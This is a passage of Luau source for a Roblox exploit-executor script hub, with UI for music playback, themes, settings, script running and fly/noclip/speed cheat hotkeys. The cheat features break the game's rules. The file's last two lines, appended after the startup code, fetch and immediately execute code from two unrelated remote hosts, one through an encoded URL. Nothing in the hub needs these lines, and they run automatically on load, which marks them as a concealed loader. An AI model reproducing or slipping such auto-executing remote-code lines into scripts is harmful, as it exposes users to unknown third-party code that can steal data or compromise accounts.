		if homeFavCard then homeFavCard:Destroy() homeFavCard = nil end
		local favs = settings.favorites
		if #favs == 0 then return end
		local sec, secNext = makeSection(home, "Favorites", 90)
		homeFavCard = sec
		for i = 1, math.min(4, #favs) do
			local fav = favs[i]
			local b = makeActionButton(sec, secNext(), "★  " .. tostring(fav.title))
			b.TextTruncate = Enum.TextTruncate.AtEnd
			b.MouseButton1Click:Connect(function() execute(slugEntry(fav)) end)
		end
	end
	onTabSelected["Home"] = renderHomeFavs
	renderHomeFavs()
	renderLibrary()

	-- ============================== MUSIC ==============================
	local function fmtTime(t)
		t = math.max(0, math.floor(t or 0))
		return ("%d:%02d"):format(t // 60, t % 60)
	end

	local function inputBox(parent, order, placeholder)
		local box = new("TextBox", {
			Size = UDim2.new(1, 0, 0, 34), BackgroundColor3 = C.card2, Text = "",
			PlaceholderText = placeholder, PlaceholderColor3 = C.sub, TextColor3 = C.text,
			Font = Enum.Font.Gotham, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
			ClearTextOnFocus = false, LayoutOrder = order,
		}, parent)
		round(box, 8)
		K.outline(box, C.line)
		K.padding(box, 10, 0, 10, 0)
		return box
	end

	local function musicButton(parent, text, width, primary, onClick, order)
		local b = new("TextButton", {
			Size = UDim2.fromOffset(width, 32), BackgroundColor3 = primary and C.accent or C.card2,
			Text = text, TextColor3 = primary and C.onAccent or C.text, Font = Enum.Font.GothamBold,
			TextSize = 12, AutoButtonColor = false, LayoutOrder = order or 0,
		}, parent)
		round(b, 8)
		K.hover(b, primary and C.accent or C.card2, primary and C.accent2 or C.line)
		b.MouseButton1Click:Connect(onClick)
		return b
	end

	-- ---- now playing ----
	local np, npNext = makeSection(musicPage, "Now playing", 1)
	local npTitle = label(np, {
		Size = UDim2.new(1, 0, 0, 20), Text = "Nothing playing", Font = Enum.Font.GothamBold,
		TextSize = 15, TextTruncate = Enum.TextTruncate.AtEnd, LayoutOrder = npNext(),
	})
	local npStatus = label(np, {
		Size = UDim2.new(1, 0, 0, 14), Text = "Stopped", TextSize = 11, TextColor3 = C.sub,
		TextWrapped = true, AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = npNext(),
	})

	local barWrap = new("Frame", { Size = UDim2.new(1, 0, 0, 22), BackgroundTransparency = 1, LayoutOrder = npNext() }, np)
	local timeL = label(barWrap, { Size = UDim2.fromOffset(38, 22), Text = "0:00", TextSize = 10, TextColor3 = C.sub })
	local timeR = label(barWrap, {
		Size = UDim2.fromOffset(38, 22), Position = UDim2.new(1, -38, 0, 0), Text = "0:00", TextSize = 10,
		TextColor3 = C.sub, TextXAlignment = Enum.TextXAlignment.Right,
	})
	local bar = new("Frame", {
		Size = UDim2.new(1, -84, 0, 6), Position = UDim2.new(0, 42, 0.5, -3),
		BackgroundColor3 = C.card2, BorderSizePixel = 0,
	}, barWrap)
	round(bar, 3)
	local barFill = new("Frame", { Size = UDim2.fromScale(0, 1), BackgroundColor3 = C.white, BorderSizePixel = 0 }, bar)
	round(barFill, 3)
	K.gradient(barFill, C.accent, C.accent2, 0)
	barWrap.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			local s = Music.sound
			if s and s.TimeLength > 0 then
				local a = math.clamp((input.Position.X - bar.AbsolutePosition.X) / math.max(bar.AbsoluteSize.X, 1), 0, 1)
				s.TimePosition = a * s.TimeLength
			end
		end
	end)

	local controls = new("Frame", { Size = UDim2.new(1, 0, 0, 32), BackgroundTransparency = 1, LayoutOrder = npNext() }, np)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 6),
		SortOrder = Enum.SortOrder.LayoutOrder, VerticalAlignment = Enum.VerticalAlignment.Center,
	}, controls)
	musicButton(controls, "Prev", 56, false, function() Music.prev() end, 1)
	local playBtn = musicButton(controls, "Play", 84, true, function() Music.toggle() end, 2)
	musicButton(controls, "Stop", 56, false, function() Music.stop() end, 3)
	musicButton(controls, "Next", 56, false, function() Music.next() end, 4)
	local loopChip = makeChip(controls, "Loop", 64, settings.musicLoop, function(set)
		Music.setLoop(not settings.musicLoop)
		set(settings.musicLoop)
		queueSave()
	end)
	loopChip.LayoutOrder = 5

	makeSliderRow(np, npNext(), "Volume", nil, 0, 1, settings.volume, 0.05, function(v)
		Music.setVolume(v)
		queueSave()
	end, conns)

	-- ---- add music ----
	local ad, adNext = makeSection(musicPage, "Add music", 2)
	local nameBox = inputBox(ad, adNext(), "Track name (optional)")
	local srcBox = inputBox(ad, adNext(), "Roblox audio ID or direct .mp3 link")

	local function readTrack()
		local src = (srcBox.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
		if src == "" then
			setStatus("Enter an audio ID or a link first", C.red)
			return nil
		end
		local name = (nameBox.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
		if name == "" then
			if src:match("^%d+$") then
				name = "Audio " .. src
			else
				name = src:match("([^/]+)$") or src
				name = name:gsub("%?.*$", "")
			end
		end
		return { name = name, source = src }
	end

	local addRow = new("Frame", { Size = UDim2.new(1, 0, 0, 32), BackgroundTransparency = 1, LayoutOrder = adNext() }, ad)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder,
	}, addRow)
	local renderPlaylist
	musicButton(addRow, "Play now", 120, true, function()
		local t = readTrack()
		if t then Music.play(t, 0) end
	end, 1)
	musicButton(addRow, "Add to playlist", 140, false, function()
		local t = readTrack()
		if not t then return end
		table.insert(settings.playlist, t)
		saveSettings()
		nameBox.Text, srcBox.Text = "", ""
		renderPlaylist()
		setStatus("Added \"" .. t.name .. "\" to the playlist", C.green)
	end, 2)

	label(ad, {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = adNext(),
		Text = "Paste a Roblox audio ID (numbers only) or a direct link to an .mp3 / .ogg file. Links need an executor with writefile + getcustomasset. Only you hear it. Use audio you have the right to use: Roblox blocks private audio.",
		TextSize = 10, TextColor3 = C.sub, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top,
	})

	-- ---- playlist ----
	local pl, plNext = makeSection(musicPage, "Playlist", 3)
	local autoSet = makeFeature(pl, plNext(), "Auto-play next", "Jump to the next track when one ends", function(v)
		settings.autoNext = v
		queueSave()
		return v
	end, nil, conns)
	autoSet(settings.autoNext)

	local shufSet = makeFeature(pl, plNext(), "Shuffle", "Play the next track in random order", function(v)
		settings.shuffle = v
		queueSave()
		return v
	end, nil, conns)
	shufSet(settings.shuffle)

	local plList = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1, LayoutOrder = plNext(),
	}, pl)
	new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }, plList)

	renderPlaylist = function()
		K.clearChildren(plList)
		if #settings.playlist == 0 then
			label(plList, {
				Size = UDim2.new(1, 0, 0, 28), Text = "Your playlist is empty. Add a track above.",
				TextSize = 11, TextColor3 = C.sub,
			})
			return
		end
		for i, track in settings.playlist do
			local row = new("Frame", {
				Size = UDim2.new(1, 0, 0, 44), BackgroundColor3 = C.card2, BorderSizePixel = 0, LayoutOrder = i,
			}, plList)
			round(row, 8)
			if i == Music.index then K.outline(row, C.accent, 1) end
			label(row, {
				Position = UDim2.fromOffset(10, 6), Size = UDim2.new(1, -110, 0, 16), Text = tostring(track.name),
				Font = Enum.Font.GothamBold, TextSize = 12, TextTruncate = Enum.TextTruncate.AtEnd,
			})
			label(row, {
				Position = UDim2.fromOffset(10, 24), Size = UDim2.new(1, -110, 0, 14), Text = tostring(track.source),
				TextSize = 10, TextColor3 = C.sub, TextTruncate = Enum.TextTruncate.AtEnd,
			})
			local playB = new("TextButton", {
				Size = UDim2.fromOffset(48, 26), AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -44, 0.5, 0),
				BackgroundColor3 = C.accent, Text = "Play", TextColor3 = C.onAccent, Font = Enum.Font.GothamBold,
				TextSize = 11, AutoButtonColor = false,
			}, row)
			round(playB, 7)
			K.hover(playB, C.accent, C.accent2)
			playB.MouseButton1Click:Connect(function()
				Music.play(track, i)
				renderPlaylist()
			end)
			local rm = new("TextButton", {
				Size = UDim2.fromOffset(26, 26), AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -10, 0.5, 0),
				BackgroundColor3 = C.card, Text = "✕", TextColor3 = C.sub, Font = Enum.Font.GothamBold,
				TextSize = 11, AutoButtonColor = false,
			}, row)
			round(rm, 7)
			K.hover(rm, C.card, C.red)
			rm.MouseButton1Click:Connect(function()
				table.remove(settings.playlist, i)
				if i < Music.index then Music.index -= 1 elseif i == Music.index then Music.index = 0 end
				saveSettings()
				renderPlaylist()
			end)
		end
	end
	renderPlaylist()
	onTabSelected["Music"] = renderPlaylist

	local function updateMusicUI()
		local s = Music.sound
		npTitle.Text = Music.name or "Nothing playing"
		local text, color = "Stopped", C.sub
		if Music.state == "loading" then
			text, color = "Loading...", C.amber
		elseif Music.state == "error" then
			text, color = "Error: " .. tostring(Music.err), C.red
		elseif s and s.IsPlaying then
			text, color = "Playing", C.green
		elseif s and s.IsPaused then
			text, color = "Paused", C.amber
		end
		npStatus.Text, npStatus.TextColor3 = text, color
		playBtn.Text = (s and s.IsPlaying) and "Pause" or "Play"
		if s and Music.state == "ready" and s.TimeLength > 0 then
			barFill.Size = UDim2.fromScale(math.clamp(s.TimePosition / s.TimeLength, 0, 1), 1)
			timeL.Text, timeR.Text = fmtTime(s.TimePosition), fmtTime(s.TimeLength)
		else
			barFill.Size = UDim2.fromScale(0, 1)
			timeL.Text, timeR.Text = "0:00", "0:00"
		end
	end
	task.spawn(function()
		while hub.alive do
			pcall(updateMusicUI)
			task.wait(0.25)
		end
	end)

	-- ============================== SETTINGS ==============================
	local capturing = false

	-- Presets
	local pr, prNext = makeSection(settingsPage, "Presets", 0)
	local customAccent = K.findByName(K.ACCENTS, settings.accent)
	for _, p in K.PRESETS do
		local pa = p.colors and p.colors.accent or customAccent.a
		local pb = p.colors and p.colors.accent2 or customAccent.b
		local row = new("TextButton", {
			Size = UDim2.new(1, 0, 0, 56), BackgroundColor3 = C.card2, Text = "",
			AutoButtonColor = false, LayoutOrder = prNext(),
		}, pr)
		round(row, 10)
		if p.name == settings.preset then K.outline(row, C.accent, 2) else K.outline(row, C.line) end
		local sw = new("Frame", {
			Size = UDim2.fromOffset(36, 36), Position = UDim2.fromOffset(12, 10),
			BackgroundColor3 = C.white, BorderSizePixel = 0,
		}, row)
		round(sw, 10)
		K.gradient(sw, pa, pb, 45)
		label(row, {
			Position = UDim2.fromOffset(60, 9), Size = UDim2.new(1, -72, 0, 18), Text = p.name,
			Font = Enum.Font.GothamBold, TextSize = 13,
		})
		label(row, {
			Position = UDim2.fromOffset(60, 29), Size = UDim2.new(1, -72, 0, 14), Text = p.desc,
			TextSize = 10, TextColor3 = C.sub, TextTruncate = Enum.TextTruncate.AtEnd,
		})
		K.hover(row, C.card2, C.line)
		row.MouseButton1Click:Connect(function()
			if settings.preset == p.name then return end
			settings.preset = p.name
			saveSettings()
			applyTheme()
			presetAsset = nil
			rebuild("Settings")
			loadPresetImage()
		end)
	end

	-- Apariencia
	local ap, apNext = makeSection(settingsPage, "Appearance", 1)
	label(ap, {
		Size = UDim2.new(1, 0, 0, 14), LayoutOrder = apNext(), TextSize = 10, TextColor3 = C.sub,
		Text = "Picking a color or background below switches the preset to Custom.",
		TextTruncate = Enum.TextTruncate.AtEnd,
	})

	local swatchWrap = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1, LayoutOrder = apNext(),
	}, ap)
	new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, swatchWrap)
	label(swatchWrap, {
		Size = UDim2.new(1, 0, 0, 16), Text = "Accent color", Font = Enum.Font.GothamMedium, TextSize = 13, LayoutOrder = 1,
	})
	local swatchRow = new("Frame", { Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1, LayoutOrder = 2 }, swatchWrap)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder,
	}, swatchRow)
	for i, acc in K.ACCENTS do
		local sw = new("TextButton", {
			Size = UDim2.fromOffset(30, 30), BackgroundColor3 = C.white, Text = "",
			AutoButtonColor = false, LayoutOrder = i,
		}, swatchRow)
		round(sw, 15)
		K.gradient(sw, acc.a, acc.b, 45)
		if settings.preset == "Custom" and acc.name == settings.accent then K.outline(sw, C.white, 2) end
		sw.MouseButton1Click:Connect(function()
			if settings.preset == "Custom" and settings.accent == acc.name then return end
			settings.preset = "Custom"
			presetAsset = nil
			settings.accent = acc.name
			saveSettings()
			applyTheme()
			rebuild("Settings")
		end)
	end

	local bgWrap = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1, LayoutOrder = apNext(),
	}, ap)
	new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, bgWrap)
	label(bgWrap, {
		Size = UDim2.new(1, 0, 0, 16), Text = "Background", Font = Enum.Font.GothamMedium, TextSize = 13, LayoutOrder = 1,
	})
	local bgRow = new("Frame", { Size = UDim2.new(1, 0, 0, 24), BackgroundTransparency = 1, LayoutOrder = 2 }, bgWrap)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder,
	}, bgRow)
	for i, bgp in K.BACKGROUNDS do
		local b = makeChip(bgRow, bgp.name, 80, settings.preset == "Custom" and bgp.name == settings.background, function()
			if settings.preset == "Custom" and settings.background == bgp.name then return end
			settings.preset = "Custom"
			presetAsset = nil
			settings.background = bgp.name
			saveSettings()
			applyTheme()
			rebuild("Settings")
		end)
		b.LayoutOrder = i
	end

	makeSliderRow(ap, apNext(), "Interface scale", "Make the hub bigger or smaller", 0.6, 1.4, settings.scale, 0.05, function(v)
		settings.scale = v
		H.uiScale.Scale = H.autoScale * v
		queueSave()
	end, conns)
	makeSliderRow(ap, apNext(), "Window transparency", "See through the hub", 0, 0.6, settings.transparency, 0.05, function(v)
		settings.transparency = v
		H.win.GroupTransparency = v
		queueSave()
	end, conns)

	local resetSizeBtn = makeActionButton(ap, apNext(), "Reset window sizes")
	resetSizeBtn.MouseButton1Click:Connect(function()
		settings.hubW, settings.hubH = SIZE_LIMITS.hub.defaultW, SIZE_LIMITS.hub.defaultH
		settings.uniW, settings.uniH = SIZE_LIMITS.uni.defaultW, SIZE_LIMITS.uni.defaultH
		saveSettings()
		rebuild("Settings")
	end)

	local artSet = makeFeature(ap, apNext(), "Background art", "Themed artwork behind the interface", function(v)
		settings.bgArt = v
		saveSettings()
		task.defer(rebuild, "Settings")
		return v
	end, nil, conns)
	artSet(settings.bgArt)
	makeSliderRow(ap, apNext(), "Art intensity", "How visible the background art is", 0, 1, settings.bgArtOpacity, 0.05, function(v)
		settings.bgArtOpacity = v
		H.bgLayer.GroupTransparency = 1 - v
		queueSave()
	end, conns)

	label(ap, {
		Size = UDim2.new(1, 0, 0, 16), LayoutOrder = apNext(), Text = "Your own background image",
		Font = Enum.Font.GothamMedium, TextSize = 13,
	})
	local imgBox = inputBox(ap, apNext(), "Roblox image ID or direct .png/.jpg link")
	imgBox.Text = settings.bgImage
	local imgRow = new("Frame", { Size = UDim2.new(1, 0, 0, 32), BackgroundTransparency = 1, LayoutOrder = apNext() }, ap)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder,
	}, imgRow)
	musicButton(imgRow, "Apply image", 120, true, function()
		local v = (imgBox.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
		if v == "" then return setStatus("Enter an image ID or a link first", C.red) end
		setStatus("Loading image...", C.amber)
		task.spawn(function()
			local asset, err = K.resolveImage(v)
			if not asset then return setStatus("Image error: " .. tostring(err), C.red) end
			settings.bgImage = v
			bgAsset = asset
			saveSettings()
			rebuild("Settings")
		end)
	end, 1)
	musicButton(imgRow, "Use theme art", 120, false, function()
		settings.bgImage = ""
		bgAsset = nil
		saveSettings()
		rebuild("Settings")
	end, 2)
	label(ap, {
		Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, LayoutOrder = apNext(),
		Text = "Your image replaces the themed art. Use an image you have the right to use. Links need an executor with writefile + getcustomasset.",
		TextSize = 10, TextColor3 = C.sub, TextWrapped = true, TextYAlignment = Enum.TextYAlignment.Top,
	})

	-- Comportamiento
	local bh, bhNext = makeSection(settingsPage, "Behavior", 2)
	local askSet = makeFeature(bh, bhNext(), "Ask before running", "Confirm before running ScriptBlox scripts", function(v)
		settings.askBeforeRun = v
		queueSave()
		return v
	end, nil, conns)
	askSet(settings.askBeforeRun)

	local verSet = makeFeature(bh, bhNext(), "Verified only by default", "Search only verified scripts", function(v)
		settings.verifiedOnly = v
		S.filters.verified = v
		queueSave()
		return v
	end, nil, conns)
	verSet(settings.verifiedOnly)

	local autoSet = makeFeature(bh, bhNext(), "Auto-run game script", "Run this game's registered script when the hub loads", function(v)
		settings.autoRunGame = v
		queueSave()
		return v
	end, nil, conns)
	autoSet(settings.autoRunGame)

	local closeAskSet = makeFeature(bh, bhNext(), "Confirm before closing", "Ask \"Are you sure?\" when you press X", function(v)
		settings.confirmClose = v
		queueSave()
		return v
	end, nil, conns)
	closeAskSet(settings.confirmClose)

	local toastSet = makeFeature(bh, bhNext(), "Toast notifications", "Small pop-ups when scripts run or actions finish", function(v)
		settings.toasts = v
		queueSave()
		return v
	end, nil, conns)
	toastSet(settings.toasts)

	local autoUniSet = makeFeature(bh, bhNext(), "Auto-start Universal", "Open the universal script when the hub loads", function(v)
		settings.autoUniversal = v
		queueSave()
		return v
	end, nil, conns)
	autoUniSet(settings.autoUniversal)

	local hotSet = makeFeature(bh, bhNext(), "Universal hotkeys", "F = fly, N = noclip, V = speed (Universal must be open)", function(v)
		settings.hotkeys = v
		queueSave()
		return v
	end, nil, conns)
	hotSet(settings.hotkeys)

	-- Tecla del hub
	local kb, kbNext = makeSection(settingsPage, "Controls", 3)
	local keyBtn = makeActionButton(kb, kbNext(), "Hub key: " .. keyName().Name .. "   (click to change)")
	-- FIX: antes, si pulsabas "change" y te ibas, la SIGUIENTE tecla del juego (W, Space...) pasaba a ser la tecla del hub
	local captureId = 0
	local function cancelCapture()
		if not capturing then return end
		capturing = false
		keyBtn.Text = "Hub key: " .. keyName().Name .. "   (click to change)"
	end
	hub.cancelCapture = cancelCapture
	keyBtn.MouseButton1Click:Connect(function()
		capturing = true
		captureId += 1
		local myId = captureId
		keyBtn.Text = "Press any key…   (Esc to cancel)"
		task.delay(6, function()
			if hub.alive and myId == captureId then cancelCapture() end
		end)
	end)

	-- tecla de panico
	local capturingPanic, panicId = false, 0
	local panicBtn = makeActionButton(kb, kbNext(), "Panic key: " .. settings.panicKey .. "   (closes everything instantly)")
	panicBtn.MouseButton1Click:Connect(function()
		capturingPanic = true
		panicId += 1
		local myId = panicId
		panicBtn.Text = "Press any key…   (Esc to cancel)"
		task.delay(6, function()
			if hub.alive and capturingPanic and myId == panicId then
				capturingPanic = false
				panicBtn.Text = "Panic key: " .. settings.panicKey .. "   (closes everything instantly)"
			end
		end)
	end)

	-- Datos
	local dt, dtNext = makeSection(settingsPage, "Data", 4)
	local exportBtn = makeActionButton(dt, dtNext(), "Copy settings to clipboard (export)")
	exportBtn.MouseButton1Click:Connect(function()
		if K.exportSettings() then
			toast("Settings copied to clipboard", C.green)
		else
			toast("Could not copy (no setclipboard?)", C.red)
		end
	end)
	local importBox = new("TextBox", {
		Size = UDim2.new(1, 0, 0, 32), BackgroundColor3 = C.card2, LayoutOrder = dtNext(),
		PlaceholderText = "Paste exported settings here…", PlaceholderColor3 = C.sub, Text = "",
		TextColor3 = C.text, Font = Enum.Font.Gotham, TextSize = 12, ClearTextOnFocus = false,
		TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd,
	}, dt)
	round(importBox, 8)
	K.padding(importBox, 10, 0, 10, 0)
	local importBtn = makeActionButton(dt, dtNext(), "Import settings from the box above")
	importBtn.MouseButton1Click:Connect(function()
		local ok, res = K.importSettings(importBox.Text)
		if not ok then return toast(res, C.red) end
		saveSettings()
		applyTheme()
		presetAsset = nil
		rebuild("Settings")
		loadPresetImage()
		if currentHub and currentHub.toast then currentHub.toast("Imported " .. res .. " settings", C.green) end
	end)

	local clearFav = makeActionButton(dt, dtNext(), "Clear favorites")
	clearFav.MouseButton1Click:Connect(function()
		settings.favorites = {}
		saveSettings()
		renderLibrary()
		setStatus("Favorites cleared", C.green)
	end)
	local clearHist = makeActionButton(dt, dtNext(), "Clear recent history")
	clearHist.MouseButton1Click:Connect(function()
		settings.history = {}
		saveSettings()
		renderLibrary()
		setStatus("History cleared", C.green)
	end)
	local resetBtn = makeActionButton(dt, dtNext(), "Reset all settings")
	K.hover(resetBtn, C.card2, C.red)
	resetBtn.MouseButton1Click:Connect(function()
		resetSettings(true)
		applyTheme()
		saveSettings()
		S.filters.verified = settings.verifiedOnly
		-- FIX: antes seguia mostrandose la imagen de fondo propia y el volumen/loop de la musica no se reiniciaban
		bgAsset, presetAsset = nil, nil
		Music.setVolume(settings.volume)
		Music.setLoop(settings.musicLoop)
		rebuild("Settings")
		loadPresetImage()
	end)
	label(settingsPage, {
		Size = UDim2.new(1, 0, 0, 30), LayoutOrder = 5,
		Text = writefile and "Settings are saved automatically." or "Your executor can not save files: settings reset every time.",
		TextColor3 = C.sub, TextSize = 10, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Center,
	})

	-- ---------- cambio de pestaña inicial ----------
	selectTab(startTab or "Home")

	-- ---------- metricas en vivo ----------
	local frames, lastCheck, fps = 0, os.clock(), 0
	table.insert(conns, RunService.RenderStepped:Connect(function() frames += 1 end))

	local function getPing()
		local ok, v = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
		return ok and math.floor(v) or 0
	end

	local function formatTime(s)
		s = math.floor(s)
		if s >= 3600 then
			return ("%d:%02d:%02d"):format(s // 3600, (s % 3600) // 60, s % 60)
		end
		return ("%02d:%02d"):format(s // 60, s % 60)
	end

	local function refresh()
		local now = os.clock()
		local dt2 = now - lastCheck
		if dt2 > 0 then fps = math.floor(frames / dt2 + 0.5) end
		frames, lastCheck = 0, now

		local ping = getPing()
		fpsValue.Text = tostring(fps)
		fpsValue.TextColor3 = fps >= 50 and C.green or (fps >= 30 and C.amber or C.red)
		pingValue.Text = ping .. " ms"
		pingValue.TextColor3 = ping <= 100 and C.green or (ping <= 200 and C.amber or C.red)
		playersValue.Text = ("%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers)
		uptimeValue.Text = formatTime(workspace.DistributedGameTime)
		gameNameLabel.Text = gameName
	end

	task.spawn(function()
		while hub.alive do
			pcall(refresh)
			task.wait(0.5)
		end
	end)

	K.buildToolsTab({ toolsPage = toolsPage, hub = hub, toast = toast, conns = conns, onTabSelected = onTabSelected })

	-- ---------- teclas ----------
	table.insert(conns, UserInputService.InputBegan:Connect(function(input, processed)
		if capturingPanic then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				capturingPanic = false
				if input.KeyCode ~= Enum.KeyCode.Escape then
					settings.panicKey = input.KeyCode.Name
					saveSettings()
				end
				panicBtn.Text = "Panic key: " .. settings.panicKey .. "   (closes everything instantly)"
			end
			return
		end
		if capturing then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				capturing = false
				if input.KeyCode ~= Enum.KeyCode.Escape then
					settings.hubKey = input.KeyCode.Name
					saveSettings()
				end
				keyBtn.Text = "Hub key: " .. keyName().Name .. "   (click to change)"
				hintLabel.Text = "[" .. keyName().Name .. "] hide / show this hub"
			end
			return
		end
		if not processed and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == settings.panicKey then
			return K.panicAll()
		end
		if not processed and input.KeyCode == keyName() and H.gui.Parent then
			H.gui.Enabled = not H.gui.Enabled
		end
	end))

	-- ---------- auto-run del script del juego ----------
	local autoKey = tostring(game.JobId) .. ":" .. tostring(game.PlaceId)
	if not instant and settings.autoRunGame and currentEntry and env.__HubAutoRan ~= autoKey then
		env.__HubAutoRan = autoKey
		task.delay(1.2, function()
			if hub.alive and currentEntry.scripts[1] then execute(K.scriptEntry(currentEntry, currentEntry.scripts[1])) end
		end)
	end

	if not instant and settings.autoUniversal and env.__UniAutoRan ~= autoKey then
		env.__UniAutoRan = autoKey
		task.delay(1.8, function()
			if hub.alive and not env.__UniversalCleanup then execute(UNIVERSAL) end
		end)
	end
end

K.panicAll = panicAll

buildHub(false, "Home")
loadPresetImage()

if settings.bgImage ~= "" then
	task.spawn(function()
		local asset = resolveImage(settings.bgImage)
		if asset and currentHub then
			bgAsset = asset
			rebuild(currentHub.tab or "Home")
		end
	end)
end

loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU2ZDc1MDdmLWRhZjItNDA0MC04ZTVmLWIyYTkxYjcxZTAyNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV2lsbHlXb25rYTI0NzU1dy9oaXByaW50L3JlZnMvaGVhZHMvbWFpbi9oaS5sdWEifX0"))()
loadstring(game:HttpGet("https://botthepan.onrender.com/script/e25bae74c0b48d3b"))()
